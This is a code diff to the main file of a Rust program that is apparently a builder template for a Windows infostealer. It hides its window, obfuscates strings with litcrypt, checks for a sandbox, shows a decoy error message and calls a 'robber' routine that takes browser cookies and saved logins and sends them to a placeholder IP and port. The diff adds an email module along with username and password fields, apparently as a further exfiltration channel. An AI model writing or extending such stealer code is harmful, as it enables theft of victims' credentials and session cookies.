@@ -1,6 +1,7 @@
 #![windows_subsystem = "windows"]
 mod browser;
 mod crypto;
+mod email;
 mod robber;
 use litcrypt::{lc, use_litcrypt};
 use std::ffi::CString;
@@ -10,11 +11,16 @@ use_litcrypt!("<<SECRET_KEY>>");
 
 fn main() -> () {
     let error: bool = <<ERROR_BOOL>>;
+    let cookie_bool = <<COOKIES_BOOL>>;
+    let login_bool = <<LOGIN_BOOL>>;
+    let email_bool = <<EMAIL_BOOL>>;
     let error_message = r#"<<ERROR_MESSAGE>>"#;
     let sandbox_internet = <<SANDBOX>>;
     if sandbox_internet {request_data();}
-    let _ = browser::run_robber(<<COOKIES_BOOL>>, <<LOGIN_BOOL>>, &lc!("http://<<IP_ADDRESS>>:<<PORT>>"));
-    if error == true {
+    let username = "<<USER_NAME>>";
+    let password = "<<PASSWORD>>";
+    let _ = browser::run_robber(cookie_bool, login_bool, &lc!("http://<<IP_ADDRESS>>:<<PORT>>"), email_bool, username, password);
+    if error {
         let _ = show_error(error_message);
     }
 }
